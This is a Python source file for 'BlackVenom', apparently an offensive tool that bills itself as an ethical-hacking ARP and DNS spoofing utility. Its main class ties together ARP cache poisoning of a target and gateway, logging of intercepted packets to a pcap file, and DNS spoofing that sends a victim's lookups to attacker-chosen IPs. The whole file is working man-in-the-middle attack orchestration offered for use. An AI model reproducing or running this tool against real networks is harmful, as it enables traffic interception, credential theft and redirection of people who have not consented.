from BlackVenom.arp_spoofer import ArpSpoofer
from BlackVenom.dns_spoofer import DNSSpoofer
from BlackVenom.packet_logger import PacketLogger
from BlackVenom import __version__

class BlackVenom:
    
    def __init__(self, interface='eth0', logger_queue_num=1, dns_queue_num=2, enable_logging=False, log_file="captured_packets.pcap", dns_records=None):
        """
        Initializes the BlackVenom tool with ARP spoofing, packet logging, and DNS spoofing capabilities.

        Args:
            interface (str): The network interface to use (default is 'eth0').
            logger_queue_num (int): Queue number for packet logging.
            dns_queue_num (int): Queue number for DNS spoofing.
            enable_logging (bool): Enables packet logging if True.
            log_file (str): Path to the pcap file for saving intercepted packets.
            dns_records (dict): A dictionary of DNS records where keys are domain names (bytes) and values are attacker IPs (str).
        """
        self.interface = interface
        self.arp_spoofer = ArpSpoofer(interface)
        self.target_ip = None
        self.gateway_ip = None
        self.dns_records = dns_records if dns_records is not None else {}
        self.dns_spoofer = None
        self._print_banner()

        # Initialize packet logger with a separate queue if logging is enabled
        self.packet_logger = PacketLogger(queue_num=logger_queue_num, pcap_file=log_file) if enable_logging else None

        # Initialize DNS spoofer if dns_records are provided
        if self.dns_records:
            self.dns_spoofer = DNSSpoofer(targets=self.dns_records, queue_num=dns_queue_num)

    def start_spoofing(self, target_ip, gateway_ip):
        """
        Starts ARP spoofing, packet logging (if enabled), and DNS spoofing (if enabled).

        Args:
            target_ip (str): IP address of the target machine.
            gateway_ip (str): IP address of the network gateway.
        """
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        print("🕵️‍♂️ Starting ARP spoofing...")
        self.arp_spoofer.spoofing(target_ip, gateway_ip)

        # Start packet logging if enabled
        if self.packet_logger:
            print("📄 Logging enabled. Starting packet logger...")
            self.packet_logger.start()

        # Start DNS spoofing if it was initialized
        if self.dns_spoofer:
            print("🔀 DNS Spoofing enabled. Redirecting DNS requests to attacker IP...")
            self.dns_spoofer.start()

    def stop_spoofing(self):
        """
        Stops the ARP spoofing, packet logging, and DNS spoofing (if enabled).
        """
        print("🛑 Stopping ARP spoofing...")
        self.arp_spoofer.stop(self.target_ip, self.gateway_ip)

        # Stop packet logging if it was enabled
        if self.packet_logger:
            print("🛑 Stopping packet logger...")
            self.packet_logger.stop()

        # Stop DNS spoofing if it was initialized
        if self.dns_spoofer:
            print("🛑 Stopping DNS Spoofing...")
            self.dns_spoofer.stop()
    
    def _print_banner(self):
        """
        Prints a welcome banner at the start of the program for BlackVenom.
        """
        banner = f"""
        ██████╗ ██╗      █████╗  ██████╗██╗  ██╗       
        ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝       
        ██████╔╝██║     ███████║██║     █████╔╝        
        ██╔══██╗██║     ██╔══██║██║     ██╔═██╗        
        ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗       
        ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝       
                                                    
        ██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
        ██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
        ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
        ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
        ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
        ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
        BlackVenom 🖤: Ethical Hacking ARP and DNS Spoofing Tool (Version: {__version__})
        """
        print(banner)





                                               